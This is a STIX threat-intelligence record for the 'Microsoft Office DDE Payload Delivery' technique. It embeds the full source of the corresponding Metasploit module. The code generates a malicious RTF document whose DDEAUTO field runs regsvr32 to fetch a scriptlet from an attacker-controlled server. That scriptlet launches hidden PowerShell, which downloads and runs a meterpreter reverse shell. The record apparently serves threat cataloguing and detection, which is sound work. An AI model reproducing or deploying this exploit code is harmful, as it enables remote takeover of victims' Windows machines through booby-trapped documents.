{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8a297ba5-6cdd-40ac-9879-1cc481d39943",
    "created": "2024-08-14T16:38:25.462329Z",
    "modified": "2024-08-14T16:38:25.462334Z",
    "name": "Microsoft Office DDE Payload Delivery",
    "description": " This module generates an DDE command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/office_dde_delivery.rb",
            "external_id": "office_dde_delivery.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/xillwillx/171c24c8e23512a891910824f506f563"
        },
        {
            "source_name": "reference",
            "url": "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule  < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n\n  def initialize(info  = {})\n    super(update_info(info,\n      'Name' => 'Microsoft Office DDE Payload Delivery',\n      'Description' => %q{\n        This module generates an DDE command to place within\n        a word document, that when executed, will retrieve a HTA payload\n        via HTTP from an web server.\n      },\n      'Author' => 'mumbai',\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => '2017-10-09',\n      'References' => [\n        ['URL', 'https://gist.github.com/xillwillx/171c24c8e23512a891910824f506f563'],\n        ['URL', 'https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/']\n      ],\n      'Arch' => [ARCH_X86, ARCH_X64],\n      'Platform' => 'win',\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'Targets' =>\n        [\n          ['Microsoft Office', {} ],\n        ],\n      'DefaultTarget' => 0,\n      'Payload' => {\n        'DisableNops' => true\n      },\n      'DefaultOptions' => {\n        'DisablePayloadHandler' => false,\n        'PAYLOAD' => 'windows/meterpreter/reverse_tcp',\n        'EXITFUNC' => 'thread'\n      }\n    ))\n    register_options([\n      OptString.new(\"FILENAME\", [true, \"Filename to save as\", \"msf.rtf\"]),\n      OptPath.new(\"INJECT_PATH\", [false, \"Path to file to inject\", nil])\n    ])\n  end\n\n  def gen_psh(url, *method)\n    ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl\n\n    if method.include? 'string'\n      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))\n    else\n      # Random filename to use, if there isn't anything set\n      random = \"#{rand_text_alphanumeric 8}.exe\"\n      # Set filename (Use random filename if empty)\n      filename = datastore['BinaryEXE-FILENAME'].blank? ? random : datastore['BinaryEXE-FILENAME']\n\n      # Set path (Use %TEMP% if empty)\n      path = datastore['BinaryEXE-PATH'].blank? ? \"$env:temp\" : %Q('#{datastore['BinaryEXE-PATH']}')\n\n      # Join Path and Filename\n      file = %Q(echo (#{path}+'\\\\#{filename}'))\n\n      # Generate download PowerShell command\n      download_string = Rex::Powershell::PshMethods.download_run(url, file)\n    end\n\n    download_and_run = \"#{ignore_cert}#{download_string}\"\n\n    # Generate main PowerShell command\n    return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)\n  end\n\n  def on_request_uri(cli, _request)\n    if _request.raw_uri =~ /\\.sct$/\n      print_status(\"Handling request for .sct from #{cli.peerhost}\")\n      payload = gen_psh(\"#{get_uri}\", \"string\")\n      data = gen_sct_file(payload)\n      send_response(cli, data, 'Content-Type' => 'text/plain')\n    else\n      print_status(\"Delivering payload to #{cli.peerhost}...\")\n      p = regenerate_payload(cli)\n      data = cmd_psh_payload(p.encoded,\n                       payload_instance.arch.first,\n                       remove_comspec: true,\n                       exec_in_place: true\n      )\n      send_response(cli, data, 'Content-Type' => 'application/octet-stream')\n    end\n  end\n\n\n  def rand_class_id\n    \"#{Rex::Text.rand_text_hex 8}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 4}-#{Rex::Text.rand_text_hex 12}\"\n  end\n\n\n  def gen_sct_file(command)\n    # If the provided command is empty, a correctly formatted response is still needed (otherwise the system raises an error).\n    if command == ''\n      return %{<?XML version=\"1.0\"?><scriptlet><registration progid=\"#{Rex::Text.rand_text_alphanumeric 8}\" classid=\"{#{rand_class_id}}\"></registration></scriptlet>}\n    # If a command is provided, tell the target system to execute it.\n    else\n      return %{<?XML version=\"1.0\"?><scriptlet><registration progid=\"#{Rex::Text.rand_text_alphanumeric 8}\" classid=\"{#{rand_class_id}}\"><script><![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"#{command}\",0);]]></script></registration></scriptlet>}\n    end\n  end\n\n  def retrieve_header(filename)\n    if (not datastore['INJECT_PATH'].nil?)\n      path = \"#{datastore['INJECT_PATH']}\"\n    else\n      path = nil\n    end\n    if (not path.nil?)\n      if ::File.file?(path)\n        ::File.open(path, 'rb') do |fd|\n          header = fd.read(fd.stat.size).split('{\\*\\datastore').first\n          header = header.to_s\n          print_status(\"Injecting #{path}...\")\n          return header\n        end\n      else\n        header = '{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}' + \"\\n\"\n        header << '{\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1' + \"\\n\"\n        header << '\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9' + \"\\n\"\n      end\n    else\n      header = '{\\rtf1\\ansi\\ansicpg1252\\deff0\\nouicompat\\deflang1033{\\fonttbl{\\f0\\fnil\\fcharset0 Calibri;}}' + \"\\n\"\n      header << '{\\*\\generator Riched20 6.3.9600}\\viewkind4\\uc1' + \"\\n\"\n      header << '\\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang9' + \"\\n\"\n    end\n    return header\n  end\n\n  def create_rtf\n    #\n    header = retrieve_header(datastore['FILENAME'])\n    field_class = '{\\field{\\*\\fldinst {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid3807165  '\n    field_class << \"DDEAUTO C:\\\\\\\\\\\\\\\\Programs\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Office\\\\\\\\\\\\\\\\MSword.exe\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\..\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\cmd.exe \\\"/c regsvr32 /s /n /u /i:#{get_uri}.sct scrobj.dll\\\" }}\"\n    field_class << '{\\fldrslt }}\\sectd \\ltrsect\\linex0\\endnhere\\sectlinegrid360\\sectdefaultcl\\sftnbj {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0' + \"\\n\"\n    field_class << '\\insrsid5790315' + \"\\n\"\n    field_class << '\\par }'\n    footer =  '}}' # footer\n    rtf = header + field_class + footer\n    rtf\n  end\n\n  def primer\n    file_create(create_rtf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-10-09",
    "x_mitre_platforms": [
        "win'"
    ]
}